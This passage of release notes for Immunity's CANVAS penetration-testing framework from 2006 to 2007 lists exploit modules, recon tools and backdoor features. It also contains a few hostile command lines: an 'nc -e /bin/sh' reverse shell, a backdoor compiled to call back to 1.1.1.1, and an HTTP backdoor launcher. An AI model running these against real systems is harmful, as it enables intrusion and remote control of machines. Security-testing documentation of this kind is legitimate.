o HP OpenView Trace Service Buffer Overflow
o Borland Intervase ibserver Create-Request Buffer Overflow
o Novell Netware Client for Windows Printer Provider RPC stack overflow

16 new Web Exploits:

linksnet_include
ncaster_include

ote_include
pbd_include
philex_include
phpnews_include
someryc_include
troforum_include

New APIS:

For those of you writing PHP include bugs, CANVAS is getting more and more
mature when it comes to an API for doing so quickly and easily. In this month's
release the spkproxy module has garnered a new object to make CANVAS friendly
for all your perl exploits, the UserAgent object.

UA = spkproxy.UserAgent(protocol+"://"+self.host+"/"+self.basepath, \
auth=auth, hostname=self.hostname, exploit=self)
data = {"A", "B"}
result = UA.POST("bob.php?var=arg", data=data)

# Or you can upload a file using MIME multipart!
fields["samstown"] = "upload"
files=[("attachment", "sam.data", filedata)]
#now upload the file
UA.multipart("swap.php", fields, files)
  
Obviously GET and PUT are also supported, and the API also will recognize
cookies in the response and remember them for subsequent calls, making it easy
to log into web services and then exploit them.

You can also call spkproxy.urlopen() directly and it will behave as you would
want it to. Proxies and other niceties are supported as you would expect.


6.25 August 1, 2007

GUI Changes:

GUI overhaul by Dan Felts! (Thanks Dan!) You'll notice everything looks 
a lot nicer.

New Modules:

o TCP SYN (port 80) and regular UDP traceroute module added

o NessusXML and NMAP XML import modules added by Dan Felts (Thanks again! :>)

o Netopia ADSL/Wireless router attack module

o CVE-2007-3681 Winpcap vulnerability added - gets local SYSTEM on machines
without the GDI Win32k.sys patch installed. (Which kind of ruins the point,
but it's quite interesting to see, regardless)

o getwwwhostnames This utility grabs a list of hostnames that apply to a web
server. This is commonly used with web attack modules which can automatically
attack all the hostnames (rather than just the default).

Thirteen new web attack modules:
o b1gbb_include
o limesurvey_include
o minibill_include
o musoo_include
o powl_include     
o serweb_include   
o sunboard_include
o dagger_include  
o lms_include         
o mknoboard_include
o phpsitebackup_include  
o ripecms_include  
o sphpell_include


Engine Changes:

o New x86 assembler added - twice as fast as the old one, resulting in MOSDEF
and exploit speedups. Likewise, the assembler no longer uses recursion, which
lets you assembly much larger code without worry that you'll fill up your
stack!


6.24 July 2, 2007

New Additions:
o Fuzzers directory (and SPIKE 3.0) added to CANVAS Professional

You'll find that this command will crash pretty much any Win32 TFTP server. If
not, try some of the other tftp scripts. We use this in some of our classes,
and have found bugs in every downloadable TFTP server we've tried.

fuzzers/spike.py -t 192.168.24.128 -s fuzzers/SPIKESCRIPTS/tftpd1.spk -P UDP -V 0:0 -p 69

This URL has more information the MSRPC portion of the fuzzer.
http://www.immunityinc.com/downloads/msrpc_fuzzing.odp


o VersionCheck added (will call back to Immunity to see if there is a new
version available, you can configure this to be off by editing Canvas.conf)

Web Exploits added:
o geeklog2_remote
o phphtml_remote
o xoops_cjcontent
o xoops_tinycontent
o mazensphpchat_remote
o sitellite_remote
o xoops_horoscope
o xoops_xtconteudo
o persism_remote
o WAnewsletter_remote
o xoops_icontent

Exploits:
o ms07_031 (DoS in ssl) added 

Engine updates:
o PPC Linux MOSDEF added

o 64 bit Python compatibility for CANVAS (Ubuntu AMD64, Vista 64 etc.) 

o tcpscan.exe fixed for Vista and XP SP2 in default conditions. This
means you are limited to 5 outbound TCP sockets at once - which will
make your portscans a lot slower, but will not have false positives.
You can still use tcpscan.exe manually with up to 64 sockets at once.


6.23 June 1, 2007

New Features:

o ./commandlineInterface.py has a new UNIXSHELL option. This allows you to use
the shellserver commands from the commandline. It's useful for uploading and
downloading files, for example. To connect to it, any callback /bin/sh
shellcode or a nc -e /bin/sh will work. (See MU, below).

The commandline interface also has readline support again. For those of you on
Windows trying to quit CANVAS on the commandline, you'll want to use the
control-Break key, rather than control-C.

o Non-executable stack support in ani_cursor

o BSD MOSDEF moved to the new MOSDEF ShellServer engine .. currently tested
with FreeBSD i386 (now with working upload/download).

New Exploits:

o tm_sprotectagent - exploit for TrendMicro ServerProtect MSRPC overflow

o MU - Exploit for OS X mDNS. Supports both Intel and PPC, although with Intel
OS X you will get back a UNIXSHELL, rather than a MOSDEFSHELL. (Currently our
Intel OS X does an execve shellcode). OS detection against OS X sometimes
works, but sometimes does not. The version 0, for MU, will auto-attack, but
will assume only Intel versions.

o solaris_samba - reliable remote root exploit for Samba LsaLookupSids heap
overflow against Samba Servers on Solaris 8/9/10 (CVE-2007-2446).

Five new web application exploits:

o aimstats_exec
o mygallery_remote
o shoutpro_exec
o wordtube_remote
o wptable_remote

6.22 May 1, 2007

New Exploits: 

Four new web exploits for PHP injection vulnerabilities. These will autodetect
a base path, and give you a PHP Node. PHP Nodes can upload/download/run
commands, which is enough to upload a testvuln3 and get a MOSDEF shell.

o flatchat2_exec
o dfblog4_exec
o blog_pixelmotion
o lsgb_exec

The MSDNS 0day:

o msdnsrpc 

Tested on:

Windows 2000 Advanced Server SP4 English UP2DATE
Windows 2003 Server Standard SP0 English OOTB
Windows 2003 Server Standard SP1 English OOTB (with DEP AlwaysOff)
Windows 2003 Server Standard SP2 English OOTB (with DEP AlwaysOff)

o CA BrightStor Backup Media Server RPC Overflow

o Novell Groupwise Web Access Base64 Stack Overflow

o Lotus Domino IMAP4 Server CRAM-MD5 Overflow

New Features:

o HTTP MOSDEF v0.1

HTTP MOSDEF is a MOSDEF based HTTP tunneling solution for use with our
Windows clientside exploits. It currently works with the BABYBOTTLE
and ani_cursor exploits and will do full HTTP based tunneling. This
includes being able to operate via web proxies. It uses the WinInet
API to automatically detect any existing browser proxy settings.

To test HTTP MOSDEF v0.1, it is preferred you run CANVAS as root due
to port binding semantics. You can then either link in BABYBOTTLE or
ani_cursor using the httpserver module and select the HTTP MOSDEF
checkbox.

Right now, you'll want to use the GUI only to use HTTP MOSDEF.

Tools:

o getservices - 

This module will list all the services available on a remote machine using a
named pipe that allows anonymous access. This will work against 2000 up to and
including SP4, but was fixed in Update Rollup 1 for SP4. Above that (UR1, XP,
etc), a username and password will be needed.

o atsvc - Remotely run programs with username and auth via Window's built in
"at service"

o TEMPLATES:

For those of you who write your own exploits, we've added our TEMPLATE
directory to the main distribution. 

Usage: TEMPLATES/newmodule.py -t <module type> -n <module name> [-O arg:value]
Win32Local: A local exploit for Windows
Info: An information gathering module, such as a recon module
HTTP: A simple exploit for an HTTP server (php eval)
FTPD: A simple exploit for an FTP server
Win32Exploit: A remote windows exploit
UnixLocalExploit: A local unix exploit or command to get privs
EmailClientSide: An exploit that you spam out at email addresses
ClientSideExploit: A client-side exploit (http)
Command: A local command run on nodes such as win32Nodes
php_include: Remote PHP include exploits
TFTP: TFTP Exploits (win32)
Config: A module that sets configuration information
MSRPCExploit: A remote MSRPC exploit
HTTP Command: execve/system exploit in an http server

Fixes:

Solaris Nodes now have a functional upload and download again.

o MS06_040 has improved Windows 2003 support

o snortrpc: exploit for Snort <= 2.6.1.2 DCERPC Reassembly stack overflow

o ani_cursor: exploit for Windows ANI File Format Parser overflow

GUI Updates:

o Multiple targeting added - Use Shift-Click to select multiple hosts and then
click the Targeting buttons to select multiple targets at once. The first
target is the "primary" target, which is what will show up in the exploit
dialog windows. Run any exploit and it will run against all the targets at
once. On Windows XP SP2 and Windows Vista you should select no more than 5
hosts at once due to the Windows Half-Open TCP socket limit.

6.20 March 1, 2007

Engine updates:

o MOSDEF caching received a bugfix that dramatically improves overall 
MOSDEF speed and performance.

o Screengrab now uses files rather than loading images entirely into 
memory. This results in a large performance improvement. Additionally, 
screengrab outputs valid BMP files which can be viewed with any image 
viewer, or imported into reports quickly and easily.

o Userenum has undergone changes that allow it to operate much faster.

o Msrpc.py received many bugfixes, including a tcp authentication fix 
and a fix for UUID minor versions.

Massattack updates:

o Massattack now has auto-trojan capabilities. If we get a new node and 
you have placed a massattack_win32trojan.exe in the CANVAS root, it 
will be uploaded and run.

o Massattack no longer attacks its own IP address.

o Maxthreads option added to allow you to set the optimal thread load 
for your platform. e.g. 5 is a good number for Vista and 65535 is a good 
number for Linux.

Exploit updates:

o ms06_040 had a target added for Windows 2003 SP0.

o ms03_049 was rewritten and had a Windows 2000 target added. It was 
also ported to French, Simplified Chinese, and Japanese Windows.

o ms04_011 was ported to Spanish, Italian, and Dutch Windows.

o ms04_049 was ported to Dutch, and Italian Windows.


6.19 February 1, 2007

New Exploits:

  o Citrix_pp: Exploit for custom print provider Citrix installs. Also works
  against XP SP2 (with DEP).
  
  o iis_doubledecode: This module exploits the rather old IIS 5.0 Double
  Decode vulnerability using CANVAS's new CLE. It's a good sample exploit,
  and perhaps useful for testing IDS signatures.

  o 3ComTFTP: An exploit for the overflow in 3ComTFTPSvc. Originally
  written with VisualSploit. 

  o ms07_004: VML recolorinfo exploit (reliable even against XP SP2)
  Clientside: use with the httpserver module from 'Servers'

  o qt_rtsp: Quicktime RTSP overflow - reliable against XP SP2
  Clientside: use with the httpserver module from 'Servers'
  
  o test_cle: A tester exploit for use with the http_command.py backdoor.
  
Immunity continues our efforts to provide exploits that work against all
Windows languages, all Windows service packs, and Windows NT 4.0 . Many
exploits were rewritten to be cross-language and cross-service pack including
the following:

o ms04_045 (WINS Name Validation)
o ms03_026 (Original LSD MSRPC Overflow)
o ms03_001 (RPC Locator)
o ms04_031 (NetDDE Stack Overflow)
o ms04_011 (LSASS Stack Overflow)

New Features:

  o Beta IPv6 support: All our Win32 MSRPC attacks will now function over IPv6.
  Currently IPv6 is supported with both Windows and Linux localNodes, i.e. the
  actual CANVAS host. IPv6 support is transparent and if your CANVAS host supports
  it, it will automatically bring the IPv6 functionality into play. If you
  experience any problems with the IPv6 support please contact bas@immunityinc.com

  Suggested method of testing IPv6 support is to use our ms03_026 exploit against
  a Windows 2003 SP0 over IPv6. Please note that when using CANVAS on Win32 you
  will have add the correct scopeID for your target. You can defer these from the
  IPv6 interface list. 

  Beta IPv6 support requires you to run Python 2.4.4 or greater for optimal
  results.

  o Halting of exploits now recurses to any child exploits. For example, 
  if you halt VulnAssess or Massattack, it will halt any exploits they have started.
  
  o Command Line Executer (CLE) is now available for exploits. It will try to
  load MOSDEF shells on remote systems given the ability to run commands
  blindly. Useful especially for web passthrough()/system()/popen() bugs.
  Currently tested on Linux/x86 and Windows/x86. The Windows version supports
  TFTP and debug.exe methods of uploading files, and the Unix version supports
  several TCP and HTTP uploaders.

  o HTTP Server is useful as a simple backdoor (or CLE tester)
  exploits/httpserver/httpserver.py -O singleexploit:runcommand -O blind:1 -p 8080

  o Also included is backdoors/http_commander.py (even simpler backdoor for CLE testing)

  o MOSDEF compiler is able to compile a MOSDEF backdoor on Unix systems
	Example: MOSDEF/cc.py -m Linux -p x86 -D CBACK_PORT=1 -D CBACK_ADDR=1.1.1.1 -T backdoors/cback_mmap_rwx.c 



6.18 January 1, 2007

First and foremost, happy new year from Immunity!

The Immunity santa comes bearing a bunch of gifts this first day of the 
new year. Yes, when Santa's done delivering the regular toys, he goes 
around dropping shells. Ho ho ho, as they say.

This release contains a lot of new toys, most noticably a large 
collection of new exploit modules and updates

New exploits:

o Heroes: exploit module for MS06_074, Windows SNMP vulnerability
o Symantec_rm: exploit module for Symantec Remote Management Overflow
o Netmail: exploit module for Novell Netmail 3.52 pre-auth stack 
  overflow
o Netware_pp: exploit for Novell Netware Client Print Provider overflow. 
  Also working against XP SP2 with DEP.
o MS04_045: exploit for WINS Name Association Stack Overflow (was 
  patched alongside the pointer hijacking vulnerability, works reliably 
  acrosss NT 4.0 SP6a and Windows 2000 SP0-SP4)

Exploit updates:

o MS06_070 was updated to include a fake _local_ (it has to be 
  reachable by netbios broadcasts) domain controller
o MS01_023 was rewritten from scratch for IIS 5.0 IPP ISAPI stack 
  overflow (language independent)
o MS01_033: was rewritten from scratch for IIS 5.0 Index Server ISAPI 
  (.ida) stack overflow (language independent)
o MS03_022: was rewritten from scratch for nsisslog.dll overflow

6.17 December 1, 2006 

New Exploits:

o MS06_066 - Microsoft Network Client RPC overflow (supports XP SP2 with DEP!)
o MS06_070 - Microsoft Workstation RPC overflow (requires external domain)
o Novell eDirectory HttpStk.dlm Overflow for 8.8 and 8.8,1 
o MS07_071 - Microsoft XML Core Services Client Side overflow (ms_xmlcore)
o Linux /proc a.out vulnerability (not a race condition, as previously assumed)

New Recon Tools:

o GetPrintProviders - this module allows you to determine the print providers 
on a remote Windows  machine. Also works against XP SP2! Print providers are 
localized and this data feeds into Immunity's remote language detection 
module to more accurately determine the language of Windows machines.

o UserEnum gets all users now, not just logged in users. This will get 
automatically called by getremotelanguage.
 
New Features:

o mosdefmigrate module now can inject into DEP protected processes. MOSDEF 
itself works with DEP now as well. testvuln3.exe has been ported to be 
DEP-clean.

o MSRPC exploits (and recon tools like userenum) will now also try to 
connect with a fake username to bypass XP's simple sharing check 

o SPIKE Proxy now lets you edit multipart/mime data.

o SmartList feature - An intelligent mechanism for preventing CANVAS from 
attacking sensitive hosts

o callback loop - this module allows you to be flexible with MOSDEF callbacks. 
You can send a callback to a specified location or send a callback to a 
specified location with a X second interval and Y repeats. The callback runs 
in it's own thread, so you can send an additional MOSDEF shell to  
someone else on your team.

o JavaNode - this is a useful backdoor on systems that support gcj (Gnu Java 
Compiler) or useful for Java injection attacks. Also supplied (in backdoors/
java2jsp.py) is a conversion utility to turn the JavaNode.java into a 
valid servlet.  

o Massattack reports are much prettier, including screenshots where possible.
